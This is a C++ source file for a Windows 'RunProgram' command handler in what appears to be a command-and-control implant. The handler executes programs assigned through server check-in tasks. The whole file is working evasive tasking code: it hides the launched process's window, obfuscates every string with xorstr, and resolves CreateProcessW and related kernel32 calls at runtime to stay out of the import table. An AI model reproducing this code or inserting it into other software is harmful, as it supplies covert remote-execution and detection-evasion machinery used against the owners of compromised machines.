// ========================================== { START OF FILE } ========================================== //
#ifdef _WIN32

#include "agent/commands/exec/run_program.h"

#include <Windows.h>

#include <string>

#include "agent/commands/command_result.h"
#include "agent/models/checkin_models.h"
#include "agent/util/api_resolver.h"
#include "agent/util/strings.h"
#include "xorstr/xorstr.hpp"

namespace agent::commands::exec {

    namespace {
        /// How long the agent waits before reporting that the program is still running.
        constexpr DWORD kWaitMs = 30000;
    }  // namespace

    CommandResult RunProgram(const models::CheckinResponse& task) {
        const std::string program = task.program.empty() ? task.command.commandlet : task.program;
        if (program.empty()) {
            return CommandResult::Error(xorstr_("Run: no program supplied"));
        }

        const HMODULE kernel32 = agent::util::get_module(xorstr_("kernel32.dll"));
        const auto create_process =
            agent::util::resolve_api<decltype(&CreateProcessW)>(kernel32, xorstr_("CreateProcessW"));
        const auto close_handle = agent::util::resolve_api<decltype(&CloseHandle)>(kernel32, xorstr_("CloseHandle"));
        const auto wait_for_single =
            agent::util::resolve_api<decltype(&WaitForSingleObject)>(kernel32, xorstr_("WaitForSingleObject"));
        const auto get_exit_code =
            agent::util::resolve_api<decltype(&GetExitCodeProcess)>(kernel32, xorstr_("GetExitCodeProcess"));

        if (create_process == nullptr || close_handle == nullptr || wait_for_single == nullptr ||
            get_exit_code == nullptr) {
            return CommandResult::Error(xorstr_("Run: could not resolve the kernel32 entry points"));
        }

        // The command line carries the program first, exactly as CreateProcessW expects; the
        // program string itself is passed separately so a quoted path is honoured.
        std::wstring command_line = agent::util::ToWide(program);
        const std::string arguments = task.command.arguments;
        if (!arguments.empty()) {
            command_line += L" ";
            command_line += agent::util::ToWide(arguments);
        }

        STARTUPINFOW startup_info{};
        startup_info.cb = sizeof(startup_info);
        startup_info.dwFlags = STARTF_USESHOWWINDOW;
        startup_info.wShowWindow = SW_HIDE;
        PROCESS_INFORMATION process_info{};

        const BOOL created = create_process(nullptr, command_line.data(), nullptr, nullptr, FALSE,
                                            CREATE_NO_WINDOW, nullptr, nullptr, &startup_info, &process_info);
        if (!created) {
            const DWORD launch_error = GetLastError();
            return CommandResult::Error(xorstr_("Run failed: could not start '") + program +
                                        xorstr_("' (GetLastError ") + std::to_string(launch_error) + xorstr_(")"));
        }

        const DWORD waited = wait_for_single(process_info.hProcess, kWaitMs);
        if (waited == WAIT_TIMEOUT) {
            close_handle(process_info.hThread);
            close_handle(process_info.hProcess);
            return CommandResult::Error(xorstr_("Run: '") + program + xorstr_("' is still running after 30s (pid ") +
                                        std::to_string(process_info.dwProcessId) + xorstr_(")"));
        }

        DWORD exit_code = 0;
        get_exit_code(process_info.hProcess, &exit_code);
        close_handle(process_info.hThread);
        close_handle(process_info.hProcess);

        if (exit_code != 0) {
            return CommandResult::Error(xorstr_("Run: '") + program + xorstr_("' exited with code ") +
                                        std::to_string(exit_code));
        }

        return CommandResult::Ok(xorstr_("Ran '") + program + xorstr_("' (exit code 0)"));
    }

}  // namespace agent::commands::exec

#endif  // _WIN32
// ========================================== { END OF FILE } ========================================== //
